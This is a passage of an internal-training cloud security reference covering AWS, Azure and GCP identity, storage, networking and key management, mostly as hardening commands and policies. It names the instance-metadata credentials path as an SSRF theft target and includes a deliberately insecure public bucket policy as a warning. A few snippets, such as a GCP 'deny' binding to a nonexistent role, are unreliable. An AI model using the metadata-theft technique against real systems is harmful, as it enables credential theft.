# Cloud & Container Security Master Reference

> **Classification:** Internal Training / Professional Reference
> **Audience:** Security Engineers, Cloud Architects, DevOps, SOC Analysts
> **Scope:** Cloud service models, shared responsibility, AWS/Azure/GCP security, identity, containers, Kubernetes, IaC, DevSecOps, serverless, compliance, and a mock breach walkthrough.
>
> **IMPORTANT DISCLAIMER:** All company names, IP addresses, account IDs, phone numbers, email addresses, credentials, and incident narratives in this document are **entirely fictional**. Any resemblance to real organizations, people, or events is coincidental. Do not use this material against any real target.

---

## Table of Contents

1. [Cloud Computing Fundamentals](#1-cloud-computing-fundamentals)
2. [Shared Responsibility Model](#2-shared-responsibility-model)
3. [AWS Security](#3-aws-security)
4. [Azure Security](#4-azure-security)
5. [GCP Security](#5-gcp-security)
6. [Cloud Identity & Access](#6-cloud-identity--access)
7. [Container Security](#7-container-security)
8. [Kubernetes Security](#8-kubernetes-security)
9. [Container Escape Techniques](#9-container-escape-techniques)
10. [Infrastructure as Code Security](#10-infrastructure-as-code-security)
11. [DevSecOps Pipeline Security](#11-devsecops-pipeline-security)
12. [Serverless Security](#12-serverless-security)
13. [Cloud Compliance & Monitoring](#13-cloud-compliance--monitoring)
14. [Mock Cloud Breach Case Study](#14-mock-cloud-breach-case-study)

---

# 1. Cloud Computing Fundamentals

## 1.1 What Is Cloud Computing?

Cloud computing delivers **on-demand compute, storage, networking, and platform services** over the internet on a pay-as-you-go basis. From a security perspective, the defining property is that **you no longer own or physically control the infrastructure** — which fundamentally shifts where and how security controls are applied.

The five essential characteristics per NIST SP 800-145:

| Characteristic | Description | Security Implication |
|---|---|---|
| **On-demand self-service** | Provision resources without human interaction | Shadow IT risk; need for governance & quotas |
| **Broad network access** | Services reachable over the network | Expanded attack surface; need for network controls |
| **Resource pooling** | Multi-tenant shared infrastructure | Tenant isolation becomes critical |
| **Rapid elasticity** | Scale up/down quickly | Auto-scaling can spread compromised resources |
| **Measured service** | Metered usage/billing | Unexpected billing spikes may indicate compromise |

## 1.2 Service Models

### IaaS — Infrastructure as a Service
Raw building blocks: virtual machines, storage, VPCs, load balancers.

- **Examples:** AWS EC2, Azure Virtual Machines, GCP Compute Engine, DigitalOcean, OpenStack.
- **You manage:** OS, runtime, middleware, applications, data, and much of the network config.
- **Provider manages:** physical hosts, hypervisor, physical network, datacenter.

### PaaS — Platform as a Service
Managed runtime/platform for applications.

- **Examples:** AWS Elastic Beanstalk, Azure App Service, GCP App Engine, Heroku, Azure SQL.
- **You manage:** application code, configuration, data access policies.
- **Provider manages:** runtime, OS patching, web servers, middleware, scaling.

### SaaS — Software as a Service
Fully managed end-user software.

- **Examples:** Microsoft 365, Google Workspace, Salesforce, Slack, Dropbox.
- **You manage:** accounts, data policies, usage, integration config.
- **Provider manages:** everything underneath (app, OS, infra, datacenter).

## 1.3 Deployment Models

| Model | Definition | Example | Security Profile |
|---|---|---|---|
| **Public** | Shared infrastructure operated by a provider | AWS us-east-1, Azure Global | Multi-tenant; strongest isolation requirements |
| **Private** | Dedicated to one organization (on-prem or hosted) | VMware private cloud, OpenStack | More control; you own physical security |
| **Hybrid** | Public + private connected | On-prem DC ↔ AWS VPC via VPN/Direct Connect | Two trust boundaries; key management & networking complexity |
| **Community** | Shared by organizations with common concerns | Gov community clouds, research grids | Shared regulatory obligations; need shared governance |

## 1.4 Cloud Security Challenges

1. **Loss of control** — physical security, hypervisor integrity, and datacenter access are outside your hands.
2. **Shared responsibility confusion** — misread boundaries lead to unpatched hosts or open buckets.
3. **Misconfiguration** — the #1 cause of cloud data breaches (open S3 buckets, overly permissive IAM, exposed databases).
4. **Credential & key management** — hardcoded secrets, leaked keys in public repos, over-privileged service accounts.
5. **Multi-tenancy & isolation** — hypervisor escape and side-channel risks (rare but real).
6. **Visibility gap** — distributed logs, API-only infrastructure make monitoring harder than on-prem.
7. **Compliance & data residency** — where data lives vs. where regulations require it.
8. **Fast-moving, elastic attack surface** — containers spin up and down faster than patching can keep pace.
9. **Shadow IT / shadow cloud** — teams stand up accounts without oversight.
10. **Shared/inherited vulnerabilities** — a vulnerability in a shared library (e.g., Log4Shell) cascades across tenants.

**Key principle:** "In the cloud, security is *configuration* plus *automation* — you cannot rely on physical barriers or manual patching."

---

# 2. Shared Responsibility Model

Every major cloud provider publishes a "shared responsibility model." The central idea: **security *of* the cloud** (provider) vs. **security *in* the cloud** (customer). The dividing line shifts depending on the service model.

## 2.1 Responsibility Breakdown by Service Model

| Responsibility | On-Prem | IaaS | PaaS | SaaS |
|---|---|---|---|---|
| Physical datacenter & hardware | 🟢 You | 🔵 Provider | 🔵 Provider | 🔵 Provider |
| Hypervisor / host OS | 🟢 You | 🔵 Provider | 🔵 Provider | 🔵 Provider |
| Guest OS & patching | 🟢 You | 🟢 You | 🔵 Provider | 🔵 Provider |
| Runtime / middleware | 🟢 You | 🟢 You | 🔵 Provider | 🔵 Provider |
| Application code | 🟢 You | 🟢 You | 🟢 You | 🔵 Provider |
| Data & access (IAM) | 🟢 You | 🟢 You | 🟢 You | 🟢 You* |

> 🟢 = You are responsible & fully in control. 🔵 = Provider is responsible. *Even in SaaS, the customer owns user identity, data classification, and access review.

## 2.2 The Detailed "Layers" Model (AWS-Style Example)

```
┌──────────────────────────────────────────────────────────────┐
│  DATA  (classification, encryption, access)      → CUSTOMER  │
├──────────────────────────────────────────────────────────────┤
│  APPLICATION  (code, config, runtime deps)       → CUSTOMER  │
├──────────────────────────────────────────────────────────────┤
│  GUEST OS  (patching, hardening, users)          → CUSTOMER  │
├──────────────────────────────────────────────────────────────┤
│  HYPERVISOR / NETWORK FABRIC / PHYSICAL INFRA  → PROVIDER    │
└──────────────────────────────────────────────────────────────┘
```

### 2.2.1 Physical Layer
- **Provider owns:** datacenter access controls, biometrics, guards, cameras, power, cooling, fire suppression.
- **Customer action:** rely on provider compliance attestations (SOC 2, ISO 27001); request physical access logs for audits.

### 2.2.2 Network Layer
- **Provider owns:** physical switches, routers, the cloud backbone, DDoS mitigation at the edge.
- **Customer owns:** their virtual network topology, subnets, firewalls (security groups / NSGs), routing, and egress controls.

### 2.2.3 Host Layer
- **Provider owns:** hypervisor integrity and the host OS underneath it.
- **Customer owns (IaaS):** the guest OS running on provisioned VMs — patching, hardening (CIS benchmarks), host firewall, user accounts.

### 2.2.4 OS / Runtime Layer (PaaS shift)
- In PaaS (e.g., App Service, Elastic Beanstalk), the **provider** patches the OS and runtime; the **customer** still sets environment variables, TLS config, and runtime versions.

### 2.2.5 Application Layer
- **Always customer-owned.** OWASP Top 10, secure code review, dependencies, secrets in code, authentication logic.

### 2.2.6 Data Layer
- **Always customer-owned.** Classification, encryption at rest/in transit, key management decisions (provider-managed vs. customer-managed keys), retention, backup, deletion.

## 2.3 Common Responsibility Mistakes

| Mistake | Consequence | Fix |
|---|---|---|
| Assuming provider patches your VMs | Ransomware via unpatched guest OS | Automate patching (patch management tooling) |
| Leaving storage public "because provider secures infra" | Public data exposure | Default deny ACLs + bucket policies |
| No customer-side key management | Inability to revoke access | Use CMKs, rotate, disable on incident |
| Skipping data classification | Over-encrypting cheap data / under-protecting sensitive data | Data classification policy + labels |

## 2.4 Responsibility Quick Reference Table

| Control | IaaS | PaaS | SaaS |
|---|---|---|---|
| Patching guest OS | Customer | Provider | Provider |
| Web app framework patching | Customer | Provider | Provider |
| App code vulnerabilities | Customer | Customer | Provider (but customer config) |
| Secrets in app config | Customer | Customer | Customer (admin) |
| IAM / user lifecycle | Customer | Customer | Customer |
| Encryption key choice | Customer | Customer (or provider) | Customer options |
| Logging & monitoring | Shared | Shared | Provider + customer SIEM |

---

# 3. AWS Security

## 3.1 Identity & Access Management (IAM)

IAM governs **who** (identity) can do **what** (action) on **which** resource, under **which conditions**.

### 3.1.1 Core IAM Entities

| Entity | What It Is | Example Use |
|---|---|---|
| **User** | A person/application with long-term credentials | `marcia.dev` for a human developer |
| **Group** | A collection of users for bulk permissions | `developers` group |
| **Role** | A temporary credential-issuing identity assumed by a user or service | `ec2-orders-svc` role for an app server |
| **Policy** | A JSON document granting (or denying) permissions | Attached to user, group, or role |
| **Policy Boundary** | Limits the max permissions an identity can hold | Restrains role creation to prevent privilege escalation |

### 3.1.2 Example IAM Policy (Least Privilege)

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "ListAndGetSpecificBucket",
      "Effect": "Allow",
      "Action": ["s3:ListBucket"],
      "Resource": "arn:aws:s3:::orders-prod-data"
    },
    {
      "Sid": "GetOnlyOrdersPrefix",
      "Effect": "Allow",
      "Action": ["s3:GetObject"],
      "Resource": "arn:aws:s3:::orders-prod-data/orders/2025/*"
    },
    {
      "Sid": "DenyEverythingOutsideRegion",
      "Effect": "Deny",
      "Action": "*",
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:RequestedRegion": "eu-west-1"
        }
      }
    }
  ]
}
```

### 3.1.3 Example Role Trust Policy (Service Role)

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```

### 3.1.4 Least Privilege Principles

1. **Start deny-by-default** — no permissions unless explicitly granted.
2. **Use roles, not long-lived keys** — especially for EC2 via instance profiles.
3. **Scope resources narrowly** — `arn:aws:s3:::bucket/prefix/*` not `arn:aws:s3:::*`.
4. **Add conditions** — `aws:SourceIp`, `aws:MultiFactorAuthAge`, `aws:PrincipalTag`.
5. **Use service control policies (SCP)** at the organization level to cap the ceiling.
6. **Rotate and audit** — enforce access key rotation ≤ 90 days; remove unused keys.

### 3.1.5 IAM CLI Example

```bash
# Create a group for read-only S3 analysts
aws iam create-group --group-name s3-analysts

# Attach the managed ReadOnly policy
aws iam attach-group-policy --group-name s3-analysts \
  --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess

# Create a user and add them to the group
aws iam create-user --user-name julia.audit
aws iam add-user-to-group --group-name s3-analysts --user-name julia.audit

# Generate a short-lived access key for the user (no long-term secret)
aws iam create-access-key --user-name julia.audit \
  --output json
```

**Mock output:**
```json
{
    "AccessKey": {
        "AccessKeyId": "AKIAEXAMPLE0A1B2C3D4",
        "SecretAccessKey": "wJalrXUtnFEMI/FICTIONAL0K7MDENG/bPxRfiCYzEXAMPLE",
        "Status": "Active"
    }
}
```
*(Access key IDs in this document are mock placeholders.)*

## 3.2 S3 Security

S3 is the #1 source of public cloud breaches due to misconfiguration. It has **four overlapping access-control layers**:

| Layer | Scope | Notes |
|---|---|---|
| **IAM policies** | Users/roles | What an identity may do |
| **Bucket policies** | The bucket | Grants to principals, incl. public |
| **Bucket ACLs** | Bucket/objects | Legacy; prefer policies |
| **Block Public Access** | Bucket/account | Master kill-switch for public access |

### 3.2.1 Example Bucket Policy (Restrict to a Specific Role + Source IP)

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::123456789012:role/etl-prod-role"
      },
      "Action": ["s3:GetObject"],
      "Resource": "arn:aws:s3:::customer-exports-prod/*",
      "Condition": {
        "IpAddress": {
          "aws:SourceIp": "203.0.113.0/24"
        }
      }
    }
  ]
}
```

### 3.2.2 Dangerous Bucket Policy (DO NOT USE)

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::customer-exports-prod/*"
    }
  ]
}
```
> `"Principal": "*"` + `GetObject` = **world-readable bucket**. This exact pattern appears in thousands of real breaches.

### 3.2.3 Encryption at Rest

| Option | Key Ownership | When to Use |
|---|---|---|
| **SSE-S3** | AWS-managed AES-256 | Default, low-cost, no key mgmt |
| **SSE-KMS** | Customer-managed KMS key | Compliance, revocable access, audit trail |
| **SSE-C** | Customer-supplied keys | You manage keys; not recommended |

Enable via CLI:
```bash
aws s3api put-bucket-encryption --bucket customer-exports-prod \
  --server-side-encryption-configuration '{
    "Rules": [
      {
        "ApplyServerSideEncryptionByDefault": {
          "SSEAlgorithm": "aws:kms",
          "KMSMasterKeyID": "arn:aws:kms:eu-west-1:123456789012:key/mock-kms-1234"
        }
      }
    ]
  }'
```

### 3.2.4 S3 Hardening Checklist

- [x] Enable **S3 Block Public Access** at the account level.
- [x] Disable ACLs on new buckets (`--object-ownership BucketOwnerEnforced`).
- [x] Enforce encryption with **bucket policy denying `PutObject` without `x-amz-server-side-encryption`**.
- [x] Enable **S3 versioning** and **MFA delete** on sensitive buckets.
- [x] Enable **S3 server access logging** to a separate log bucket.
- [x] Use **S3 Intelligent-Tiering / lifecycle rules** to expire old data.
- [x] Audit with **Access Analyzer** to detect external bucket access.

### 3.2.5 Audit a Bucket

```bash
# Check who can access the bucket (policy + ACL + grants)
aws s3api get-bucket-policy-status --bucket customer-exports-prod

# Find all public buckets across the account
aws s3api list-buckets --query "Buckets[].Name" | while read b; do
  aws s3api get-public-access-block --bucket "$b" 2>/dev/null | grep -q '"PublicAccessBlockConfiguration": {"BlockPublicAcls": true'
done
```

**Mock output (Access Analyzer finding):**
```json
{
  "findings": [
    {
      "id": "f-EXAMPLE9f1",
      "principal": { "AWS": "*" },
      "action": ["s3:GetObject"],
      "resource": "arn:aws:s3:::customer-exports-prod",
      "isPublic": true,
      "status": "ACTIVE",
      "findingType": "External access"
    }
  ]
}
```

## 3.3 VPC Security

A VPC is your virtual data center: subnets, route tables, gateways, and two types of firewalls.

### 3.3.1 Security Groups vs. Network ACLs

| Property | Security Group (SG) | Network ACL (NACL) |
|---|---|---|
| Scope | Instance-level (ENI) | Subnet-level |
| State | **Stateful** (return traffic auto-allowed) | **Stateless** (must allow both directions) |
| Rules | Allow only (implicit deny) | Allow **and** deny rules |
| Evaluation | All rules evaluated | Rule order (lowest number wins) |
| Default | Deny inbound, allow outbound | Allow all in/out |

**Use SG as primary, NACL as a secondary subnet-level filter** (e.g., blocking botnet CIDRs).

### 3.3.2 Example Security Group Rule (Web Tier)

```bash
# Allow HTTPS from anywhere
aws ec2 authorize-security-group-ingress \
  --group-id sg-0abc123def4567890 \
  --protocol tcp --port 443 --cidr 0.0.0.0/0

# Allow SSH only from the bastion CIDR
aws ec2 authorize-security-group-ingress \
  --group-id sg-0abc123def4567890 \
  --protocol tcp --port 22 --cidr 198.51.100.0/28
```

> The classic mistake: opening **port 22 to 0.0.0.0/0**. Brute-forcers scan the whole internet for this within minutes of instance launch.

### 3.3.3 NACL Example (Restrictive Subnet)

```json
{
  "NetworkAclEntry": [
    { "RuleNumber": 100, "Protocol": "tcp", "PortRange": {"From": 443, "To": 443}, "CidrBlock": "0.0.0.0/0", "RuleAction": "allow" },
    { "RuleNumber": 110, "Protocol": "tcp", "PortRange": {"From": 3306, "To": 3306}, "CidrBlock": "10.0.2.0/24", "RuleAction": "allow" },
    { "RuleNumber": 200, "Protocol": "-1", "CidrBlock": "0.0.0.0/0", "RuleAction": "deny" }
  ]
}
```
(Mock: MySQL 3306 only from the app subnet `10.0.2.0/24`; everything else denied.)

### 3.3.4 VPC Peering & Transitive Routing

- **VPC Peering:** connects two VPCs (same or cross-account) using private IPs. Rules:
  - **No transitive routing** — A peered with B and A peered with C does NOT connect B↔C.
  - Peering is not transitive across accounts; use a **transit gateway** for hub-and-spoke.
  - Update **route tables on both sides**; update **SGs/NACLs** to allow the peer CIDRs.

## 3.4 EC2 Security

### 3.4.1 Key Pairs
- The `.pem` private key is **the only way** into the instance (if using key-auth) — losing it means losing access.
- **Never** store `.pem` files in repos or paste into tickets.
- Recommended: SSH keys → **Session Manager (SSM)** for access without inbound SSH at all.

### 3.4.2 Instance Profiles (Roles for EC2)
Put credentials on the instance via an **instance profile**, never by baking keys into the AMI:

```bash
# Create a role
aws iam create-role --role-name ec2-orders-app \
  --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ec2.amazonaws.com"},"Action":"sts:AssumeRole"}]}'

# Attach a narrowly-scoped policy
aws iam put-role-policy --role-name ec2-orders-app \
  --policy-name read-orders-db \
  --policy-document '{
      "Version":"2012-10-17",
      "Statement":[{"Effect":"Allow","Action":["s3:GetObject"],"Resource":"arn:aws:s3:::app-config/orders/*"}]}'

# Create the instance profile and attach
aws iam create-instance-profile --instance-profile-name ec2-orders-app-prof
aws iam add-role-to-instance-profile --instance-profile-name ec2-orders-app-prof --role-name ec2-orders-app
```

### 3.4.3 EC2 Hardening Checklist
- [ ] No port 22/3389 open to the internet; use SSM Session Manager.
- [ ] Apply **latest patched AMI**; use **Patch Manager** or golden AMIs.
- [ ] Use **instance profiles** (no embedded credentials).
- [ ] Enable **detailed CloudWatch monitoring** + **GuardDuty**.
- [ ] Terminate idle instances; enable **IMDSv2-only** (prevents SSRF token theft).
- [ ] Tag everything for ownership and cost attribution.

```bash
# Enforce IMDSv2 only (blocks v1 metadata token smuggling)
aws ec2 modify-instance-metadata-options \
  --instance-id i-0f4e2c9a71b3d5e8f \
  --http-tokens required \
  --http-endpoint enabled
```

## 3.5 CloudTrail Logging

CloudTrail records **every API call** in your account — your audit backbone.

| Feature | Purpose |
|---|---|
| **Management events** | Console/CLI/SDK calls (`iam`, `s3`, `ec2`, `sts`) |
| **Data events** | Object-level `s3:GetObject`, `s3:PutObject`, Lambda invocations |
| **Insights events** | Anomalous activity detection |
| **Multi-region trail** | Capture all regions in one trail |
| **Organization trail** | One trail for the whole AWS org |

```bash
# Create a multi-region, log-encrypted trail
aws cloudtrail create-trail --name org-trail \
  --s3-bucket-name mock-cloudtrail-logs \
  --is-multi-region-trail \
  --enable-log-file-validation \
  --kms-key-id arn:aws:kms:eu-west-1:123456789012:key/mock-ct-key

# Enable data events for a sensitive bucket
aws cloudtrail put-event-selectors --trail-name org-trail \
  --event-selectors '[{"ReadWriteType":"All","IncludeManagementEvents":true,"DataResources":[{"Type":"AWS::S3::Object","Values":["arn:aws:s3:::customer-exports-prod/"]}]}]'

# Search for a suspicious action
aws cloudtrail lookup-events --lookup-attributes \
  AttributeKey=EventName,AttributeValue=GetSecretValue --max-results 50
```

## 3.6 AWS KMS

- **CMK / KMS keys** control encryption at rest for S3, EBS, RDS, Lambda env vars.
- **Customer-managed keys** let you **revoke/disable** access during incidents and get key usage audit logs.
- Use **key rotation** (automatic yearly for symmetric keys), **key policies**, and **grants** for cross-service use.
- Never send plaintext secrets over the network; KMS decrypts in-memory only.

```bash
# Create a customer-managed key
aws kms create-key --description "orders-prod data key" \
  --key-usage ENCRYPT_DECRYPT \
  --key-spec SYMMETRIC_DEFAULT \
  --policy '{"Version":"2012-10-17","Statement":[{"Sid":"Enable IAM","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::123456789012:root"},"Action":"kms:*","Resource":"*"}]}'

# Enable automatic rotation
aws kms enable-key-rotation --key-id mock-kms-1234
```

## 3.7 Common AWS Misconfigurations & Mock Breaches

| # | Misconfiguration | Mock Breach Summary (fictional) |
|---|---|---|
| 1 | **Public S3 bucket** | Fictional retailer "AcmeCloudMart" left `acmemart-backups` public; 12M customer records scraped by a scraper bot for 9 days before discovery. |
| 2 | **Leaked IAM keys in GitHub** | A fictional startup committed `AKIA...` keys to a public repo; attacker ran `ec2:RunInstances` + `iam:CreateAccessKey`, spinning up crypto miners costing $48k in 36 hours. |
| 3 | **Over-permissive role** | Fictional SaaS "NimbusCRM" gave `AdministratorAccess` to its CI role; a compromised npm dependency in CI exfiltrated all secrets and deleted the prod DB. |
| 4 | **Open RDS/Elasticsearch to 0.0.0.0/0** | Fictional analytics firm exposed Elasticsearch on port 9200; attacker dumped the index containing PII and ransomware-encrypted the cluster. |
| 5 | **IMDSv1 SSRF** | Fictional e-commerce site had an SSRF in an image proxy; attacker fetched `169.254.169.254/latest/meta-data/iam/security-credentials/` and stole the EC2 role's keys. |
| 6 | **Unused IAM keys** | Attacker used a 4-year-old rotated-but-not-deleted key of a departed employee (fictional "DeltaFreight") to trigger `s3:PutObject` into the prod bucket with malware. |
| 7 | **CloudTrail disabled in one region** | Fictional firm ran in eu-west-1 but only trailed us-east-1; the attacker operated in the untracked region for 3 weeks undetected. |

---

# 4. Azure Security

## 4.1 Microsoft Entra ID (formerly Azure AD)

Entra ID is the **identity plane** for Azure, Microsoft 365, and thousands of SaaS apps.

| Concept | Purpose |
|---|---|
| **Tenant** | One Entra ID directory = one org identity boundary |
| **Tenant ID** | Globally unique GUID identifying the tenant |
| **Users** | Human and service identities |
| **Service principals** | Application/automation identities |
| **Managed identities** | Auto-managed Azure service identities (no credentials to store) |
| **Conditional Access** | Policy engine gating access by conditions |

## 4.2 Azure RBAC Roles

RBAC controls **what an identity can do to Azure resources** (separate from Entra roles which govern directory access).

| Built-in Role | Permission | Risk if Overused |
|---|---|---|
| Owner | Everything + delegate access | Full compromise potential |
| Contributor | Everything except access mgmt | Can destroy/modify resources |
| Reader | Read-only | Low risk |
| Storage Blob Data Contributor | Blob data ops | Data access without mgmt rights |

**Key principle:** prefer **least privilege + PIM (Privileged Identity Management)** for time-boxed elevation.

```bash
# Assign Contributor on a resource group only
az role assignment create \
  --assignee "user@fictionalcorp.onmicrosoft.com" \
  --role "Contributor" \
  --scope "/subscriptions/1111-aaaa-2222-bbbb/resourceGroups/prod-networking"
```

## 4.3 Managed Identities

- **System-assigned:** one identity per Azure resource, tied to its lifecycle.
- **User-assigned:** standalone identity assignable to many resources.
- **Never store client secrets in code** — use managed identities to reach Key Vault.

```bash
# Give a web app a system-assigned identity
az webapp identity assign --name mock-webapp --resource-group rg-mock

# Grant that identity access to Key Vault secrets
az keyvault set-policy \
  --name mock-vault-01 \
  --object-id "$(az webapp identity show --name mock-webapp -g rg-mock --query principalId -o tsv)" \
  --secret-permissions get list
```

## 4.4 Azure Key Vault

- Store secrets, keys, and certs centrally with **rotation** and **audit logging**.
- Use **RBAC** or **access policies** to scope who/what can read.
- **Purge protection + soft delete** prevent permanent secret loss.
- Enable **diagnostic logs** to a Log Analytics workspace / Sentinel.

```bash
# Store a secret
az keyvault secret set --vault-name mock-vault-01 \
  --name "db-conn-str" --value "Server=mock-sql.database.windows.net;..."

# Retrieve it (app code should use the SDK, not the CLI, and never log it)
az keyvault secret show --vault-name mock-vault-01 --name "db-conn-str" \
  --query "value" -o tsv
```

## 4.5 Network Security Groups (NSGs)

Like AWS SGs but can be **stateful** with allow/deny rules; attach to subnets or NICs.

```powershell
# Create NSG rule: allow HTTPS from internet, deny everything else
$nsg = New-AzNetworkSecurityGroup -ResourceGroupName rg-mock \
  -Location "westeurope" -Name "nsg-web"

$rule = New-AzNetworkSecurityRuleConfig -Name "Allow-HTTPS" \
  -Protocol Tcp -Direction Inbound -Priority 100 \
  -SourceAddressPrefix Internet -SourcePortRange * \
  -DestinationAddressPrefix * -DestinationPortRange 443 -Access Allow
```

## 4.6 Microsoft Defender for Cloud

- **CSPM** (Cloud Security Posture Management): continuous assessment vs. Azure Security Benchmark.
- **CWP** (Cloud Workload Protection): agent-based + agentless scanning of VMs/containers.
- **Defender XDR / Sentinel:** SIEM + SOAR on top.
- Produces **recommendations**, **regulatory compliance dashboard**, and **workload protections**.

**Mock Defender finding:**
```
Recommendation: Storage accounts should restrict network access
Severity: Medium
Resource: mockstorageaccount01
Description: Allow access from specific virtual networks only.
Status: Unhealthy
```

## 4.7 Common Azure Misconfigurations

| # | Misconfiguration | Impact |
|---|---|---|
| 1 | **Storage account `AllowBlobPublicAccess = true`** | Anonymous blob reads; data exposure |
| 2 | **NSG wide open (0.0.0.0/0 on 1433)** | SQL brute-force / ransomware groups targeting Azure SQL |
| 3 | **Global admin accounts with no MFA** | Phishing → tenant takeover |
| 4 | **Contributor role too broad** | Lateral movement within a subscription |
| 5 | **Key Vault with permissive access policy (`*`)** | Any principal in the tenant reads secrets |
| 6 | **Managed identity on a VM with broad RBAC** | Token theft via SSRF on the VM's IMDS endpoint |
| 7 | **Default endpoints** | Leaving public endpoints enabled on App Services with no authentication |

---

# 5. GCP Security

## 5.1 GCP IAM

GCP IAM binds **members** to **roles** on **resources**:

```
project / folder / org ──► IAM policy (bindings) ──► members
```

- **Roles:** Primitive (`roles/owner`, `roles/editor`, `roles/viewer`), Predefined (scoped), Custom (fine-grained).
- **Members:** `user:email`, `serviceAccount:SA@project.iam.gserviceaccount.com`, `group:...`, `allUsers` (⚠️), `allAuthenticatedUsers` (⚠️).

### 5.1.1 Example gcloud Policy Binding

```bash
# Grant the "Cloud SQL Viewer" role to an engineer on a specific project
gcloud projects add-iam-policy-binding mock-project-123456 \
  --member="user:rita@fictionalcorp.com" \
  --role="roles/cloudsql.viewer"

# Deny binding (deny rules override allow)
gcloud projects add-iam-policy-binding mock-project-123456 \
  --member="user:rita@fictionalcorp.com" \
  --role="roles/iam.denyDenier" \
  --condition='expression=resource.service=="compute.googleapis.com"'
```

## 5.2 Service Accounts

- **Service accounts** are the GCP equivalent of service principals — used by VMs, Cloud Run, Functions, etc.
- **Never put JSON service-account keys in source control.**
- Prefer **Workload Identity Federation** or **Attached Service Accounts** over downloading keys.
- A leaked service-account key with `roles/editor` on a project = full project takeover.

```bash
# Create a service account
gcloud iam service-accounts create mock-sa-build \
  --description="CI build account (mock)" \
  --display-name="mock-sa-build"

# Bind a minimal role on the bucket it needs
gsutil iam ch serviceAccount:mock-sa-build@mock-project.iam.gserviceaccount.com:roles/storage.objectViewer gs://mock-build-artifacts
```

## 5.3 VPC Firewall Rules

GCP firewall rules are **stateful**, applied to VPC networks at the **subnet/network level** (inferred from tags/service accounts).

| Concept | Meaning |
|---|---|
| **Priority** | Lower number = higher priority |
| **Direction** | INGRESS / EGRESS |
| **Action** | Allow / Deny |
| **Targets** | Tags, service accounts, or network-wide |
| **Source/dest** | CIDRs, tags, service accounts |

```bash
# Allow SSH only from the bastion subnet (10.0.0.0/24)
gcloud compute firewall-rules create allow-ssh-bastion \
  --direction=INGRESS --priority=100 \
  --network=default --action=ALLOW \
  --rules=tcp:22 --source-ranges=10.0.0.0/24

# Explicitly deny all other inbound (defense in depth)
gcloud compute firewall-rules create deny-all-inbound \
  --direction=INGRESS --priority=1000 \
  --network=default --action=DENY \
  --rules=tcp --source-ranges=0.0.0.0/0
```

## 5.4 Cloud KMS

- **Cloud HSM / Cloud KMS** for managed keys; **Customer-Managed Encryption Keys (CMEK)** for at-rest encryption.
- Use **CryptoKey rotation**, key **versioning**, and **IAM on keyrings**.
- **CSEK** (Customer-Supplied Encryption Keys) if you want to hold the raw key material.

```bash
# Create a keyring and key
gcloud kms keyrings create mock-keyring --location global
gcloud kms keys create mock-key --location global \
  --keyring mock-keyring --purpose encryption \
  --rotation-period=30d \
  --next-rotation-time="2026-09-01T00:00:00Z"
```

## 5.5 Organization Policies (Org Policies)

Org policies enforce guardrails at the **organization/folder** level. Key ones for security:

| Policy | Effect |
|---|---|
| `iam.disableServiceAccountKeyCreation` | Stops users creating long-lived SA keys |
| `storage.uniformBucketLevelAccess` | Forces uniform IAM (no per-object ACLs) |
| `compute.vmExternalIpAccess` | Prevents public external IPs on VMs |
| `constraints/sql.restrictPublicIp` | Denies public IP on Cloud SQL |
| `iam.automaticIamGrantsForDefaultServiceAccounts` | Disables automatic editor grants |

```bash
# Enforce uniform bucket-level access org-wide
gcloud resource-manager org-policies set-policy --organization=123456789012 policy.yaml

# policy.yaml (mock)
# name: organizations/123456789012/policies/storage.uniformBucketLevelAccess
# spec:
#   rules:
#   - enforce: true
```

## 5.6 Common GCP Misconfigurations

| # | Misconfiguration | Impact |
|---|---|---|
| 1 | **Leaked service-account JSON key** | Attacker authenticates as SA with whatever roles it holds |
| 2 | **`allUsers` on Cloud Storage** | Public bucket reads (identical to AWS `Principal:*`) |
| 3 | **Default firewall rules allowing all ingress** | Exposure of internal services |
| 4 | **SA with `roles/editor`** | Near-root power; no `iam.setIamPolicy` restriction |
| 5 | **No org policies** | Teams create SA keys, public IPs, permissive buckets |
| 6 | **Open Cloud SQL with public IP + weak password** | Database scraping |

---

# 6. Cloud Identity & Access

## 6.1 SSO, Federation & Workload Identity

| Term | Definition |
|---|---|
| **SSO (Single Sign-On)** | One login grants access to many apps |
| **Federation** | Trust between your IdP (e.g., Okta, Entra ID, Google) and a cloud SP |
| **Workload identity** | Identity for non-human workloads (service accounts, roles, service principals) |
| **SAML / OIDC** | Protocols used for federation assertions |
| **SCIM** | Automates user provisioning/deprovisioning into apps |

### 6.1.1 Federation Flow (AWS with SAML, simplified)

```
User → Entra ID/Okta login (MFA)
         │ SAML assertion (signed)
         ▼
AWS STS AssumeRoleWithSAML → temporary credentials → console/API
```

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:saml-provider/mock-sso"
      },
      "Action": "sts:AssumeRoleWithSAML",
      "Condition": {
        "StringEquals": {
          "saml:aud": "https://signin.aws.amazon.com/saml"
        }
      }
    }
  ]
}
```

### 6.1.2 Workload Identity Federation (GCP Example)

```bash
# Allow GitHub Actions to assume an SA without a static key
gcloud iam workload-identity-pools create mock-gh-pool \
  --location global

gcloud iam workload-identity-pools providers create-oidc mock-gh-provider \
  --location global \
  --workload-identity-pool mock-gh-pool \
  --issuer-uri "https://token.actions.githubusercontent.com" \
  --attribute-mapping "google.subject=assertion.sub,attribute.repository=assertion.repository"
```

**Result:** no long-lived service-account JSON keys in CI — tokens are minted on-demand and short-lived.

## 6.2 Service Principals & Token Lifecycles

- **Never** share one service principal across environments; create one per app per env.
- **Rotate** secrets and prefer **federated/token-based** auth over static secrets.
- **Token lifetimes:** cloud-provider tokens default to minutes/hours (AWS ~1h, Azure 1h, GCP 1h); keep them short and require re-auth.

## 6.3 Mock Azure Conditional Access Policy (JSON)

